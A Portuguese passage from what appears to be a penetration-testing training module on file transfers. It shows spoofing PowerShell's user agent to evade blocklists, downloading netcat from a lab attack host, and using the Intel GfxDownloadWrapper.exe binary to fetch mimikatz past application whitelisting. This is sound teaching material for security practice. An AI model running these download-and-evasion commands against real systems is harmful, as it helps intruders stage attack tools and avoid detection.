## Alterando o agente do usuário

Se administradores ou defensores diligentes tiverem colocado na lista negra qualquer um desses agentes de usuários, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contém um parâmetro UserAgent, que permite alterar o agente do usuário padrão para um emulador do Internet Explorer, Firefox, Chrome, Opera ou Safari. Por exemplo, se o Chrome for usado internamente, definir esse agente do usuário poderá fazer com que a solicitação pareça legítima.

#### Listando agentes de usuários


```powershell-session
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Invocando Invoke-WebRequest para baixar nc.exe usando um agente de usuário do Chrome:

#### Solicitação com o Chrome User Agent

```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```

```shell-session
casluxd@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

## LOLBAS / GTFOBins

O whitelisting de aplicativos pode impedir que você use o PowerShell ou Netcat, e o registro da linha de comando pode alertar os defensores sobre sua presença. Nesse caso, uma opção pode ser usar um "LOLBIN" ( vivendo fora do binário terrestre ), também conhecido como "binários de confiança equivocados." Um exemplo de LOLBIN é o driver gráfico Intel para Windows 10 ( GfxDownloadWrapper.exe ), instalado em alguns sistemas e contém funcionalidade para baixar arquivos de configuração periodicamente. Essa funcionalidade de download pode ser chamada da seguinte maneira:

#### Transferindo arquivo com o GfxDownloadWrapper.exe

```powershell-session
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Esse binário pode ser permitido executar com lista de permissões de aplicativos e ser excluído do alerta. Outros binários mais comumente disponíveis também estão disponíveis e vale a pena verificar o [LOLBAS](https://lolbas-project.github.io/) projeto para encontrar um binário adequado para "download de arquivos" que exista em seu ambiente. O equivalente do Linux é o [GTFOBins](https://gtfobins.github.io/) projeto e definitivamente também vale a pena conferir. No momento da redação deste artigo, o projeto GTFOBins fornece informações úteis sobre quase 40 binários comumente instalados que podem ser usados para executar transferências de arquivos.

## Pensamentos finais

Como vimos neste módulo, existem muitas maneiras de transferir arquivos de e para o nosso host de ataque entre os sistemas Windows e Linux. Vale a pena praticar o maior número possível deles em todos os módulos no caminho do Penetration Tester. Tem um shell da web em um alvo? Tente baixar um arquivo para o destino para enumeração adicional usando o Certutil. Precisa baixar um arquivo do destino? Experimente um servidor SMB de empacotamento ou um servidor web Python com recursos de upload. Volte a este módulo periodicamente e esforce-se para usar todos os métodos ensinados de alguma maneira. Além disso, reserve um tempo sempre que estiver trabalhando em um destino ou laboratório para procurar um LOLBin ou GTFOBin com o qual nunca trabalhou antes para atingir suas metas de transferência de arquivos.
